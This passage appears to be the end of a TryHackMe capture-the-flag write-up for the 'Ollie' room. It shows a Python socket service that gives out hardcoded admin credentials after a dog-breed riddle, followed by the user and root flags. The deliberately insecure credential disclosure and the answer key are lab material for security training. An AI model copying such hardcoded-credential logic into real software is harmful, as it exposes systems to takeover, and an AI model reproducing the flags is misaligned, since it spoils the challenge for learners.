    c.send(f'What\'s up, {user.capitalize()}! It\'s been a while. What are you here for? '.encode("utf-8"))
    what = c.recv(1024).decode("utf-8").strip("\n")
    if 'food' in what.lower():
        c.send(b'I am hungry, I need food. You better be careful. I\'ve been known to bite. Moving on...\n')
        sleep(1.5)
        c.send(b'Ya know what... I have an idea. A question to test your knowledge about me...\n')
        sleep(2)
    else:
        c.send(f'Ya\' know what? {user.capitalize()}. If you can answer a question about me, I might have something for you.\n'.encode("utf-8"))
        sleep(1.5)

    while True:
        c.send(f'\n\nWhat breed of dog am I? I\'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? '.encode("utf-8"))
        riddle = c.recv(1024).decode("utf-8").strip("\n")
        if 'bulldog' not in riddle.lower():
            c.send(b'You are wrong! I\'m sorry, but this is serious business. Let\'s try again...\n')
        else:
            c.send(b'You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...\nPlease hold on a minute\n')
            sleep(2)
            c.send(b'Ok, I\'m back.\nAfter a lengthy discussion, we\'ve come to the conclusion that you are the right person for the job.')
            sleep(2)
            c.send(b'''Here are the credentials for our administration panel.\n
                    Username: admin\n
                    Password: OllieUnixMontgomery!\n\n''')
            sleep(1)
            c.send(b'PS: Good luck and next time bring some treats!\n\n')
            break

    c.close()



if __name__ == "__main__":
    while True:
        try:
            c,a = s.accept()
            thread = threading.Thread(target=lambda: catch(c,a))
            thread.setDaemon(True)
            thread.start()
        except KeyboardInterrupt:
            s.close()
            exit()
        except Exception:
            continue


```


![[Pasted image 20230224131339.png]]

What is the user.txt flag?

Ollie doesn't give hints!

*THM{Ollie_boi_is_daH_Cut3st}*

What is the root.txt flag?

*THM{Ollie_Luvs_Chicken_Fries}*


[[Training for New Analyst]]